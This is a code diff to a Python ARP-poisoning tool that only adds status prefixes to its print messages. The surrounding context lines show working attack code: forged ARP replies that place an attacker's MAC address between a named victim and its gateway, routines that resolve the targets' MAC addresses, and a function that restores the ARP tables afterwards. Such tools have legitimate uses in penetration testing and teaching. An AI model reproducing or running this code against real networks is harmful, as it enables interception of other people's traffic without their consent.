@@ -26,12 +26,12 @@ def poison_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, int
         victim_arp_response = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst=victim_mac, hwsrc=attacker_mac)
         gateway_arp_response = ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=attacker_mac)
         send(victim_arp_response, iface=interface, verbose=False)
-        print("ARP poison sent: [Victim IP: %s | Spoofed as Gateway IP: %s]" % (victim_ip, gateway_ip))
+        print("[|] ARP poison sent: [Victim IP: %s | Spoofed as Gateway IP: %s]" % (victim_ip, gateway_ip))
         send(gateway_arp_response, iface=interface, verbose=False)
-        print("ARP poison sent: [Gateway IP: %s | Spoofed as Victim IP: %s]" % (gateway_ip, victim_ip))
+        print("[|] ARP poison sent: [Gateway IP: %s | Spoofed as Victim IP: %s]" % (gateway_ip, victim_ip))
 
     except Exception as e:
-        print("Failed to send ARP poison: %s" % str(e))
+        print("[Err] Failed to send ARP poison: %s" % str(e))
 
 def restore_network(victim_ip, victim_mac, gateway_ip, gateway_mac, interface):
     """
@@ -54,9 +54,9 @@ def restore_network(victim_ip, victim_mac, gateway_ip, gateway_mac, interface):
     try:
         send(ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5, iface=interface, verbose=False)
         send(ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=5, iface=interface, verbose=False)
-        print("ARP tables restored for [Victim IP: %s, Gateway IP: %s]" % (victim_ip, gateway_ip))
+        print("[-] ARP tables restored for [Victim IP: %s, Gateway IP: %s]" % (victim_ip, gateway_ip))
     except Exception as e:
-        print("Failed to restore network: %s" % str(e))
+        print("[Err] Failed to restore network: %s" % str(e))
 
 class ArpPoisoner():
     """
@@ -78,19 +78,19 @@ class ArpPoisoner():
         if not self.args.victim_mac:
             self.args.victim_mac = get_mac_address(self.args.victim_ip, interface=self.args.interface)
             if not args.victim_mac:
-                print("Failed to find MAC address for victim IP: {}".format(self.args.victim_ip))
+                print("[Err] Failed to find MAC address for victim IP: {}".format(self.args.victim_ip))
                 return
 
         if not self.args.gateway_mac:
             self.args.gateway_mac = get_mac_address(self.args.gateway_ip, interface=self.args.interface)
             if not args.gateway_mac:
-                print("Failed to find MAC address for gateway IP: {}".format(self.args.gateway_ip))
+                print("[Err] Failed to find MAC address for gateway IP: {}".format(self.args.gateway_ip))
                 return
 
         if not self.args.attacker_mac:
             self.args.attacker_mac = get_local_mac(interface=self.args.interface)
             if not self.args.attacker_mac:
-                print("Failed to find MAC address for attacker interface: {}".format(self.args.interface))
+                print("[Err] Failed to find MAC address for attacker interface: {}".format(self.args.interface))
                 return
    
     def start(self):
@@ -102,7 +102,7 @@ class ArpPoisoner():
 
     def stop(self):
         self.running = False
-        print("Stopping ARP poisoning and restoring network...")
+        print("[-] Stopping ARP poisoning and restoring network...")
         restore_network(self.args.victim_ip, self.args.victim_mac, self.args.gateway_ip, self.args.gateway_mac, self.args.interface)
         disable_ip_forwarding()
 
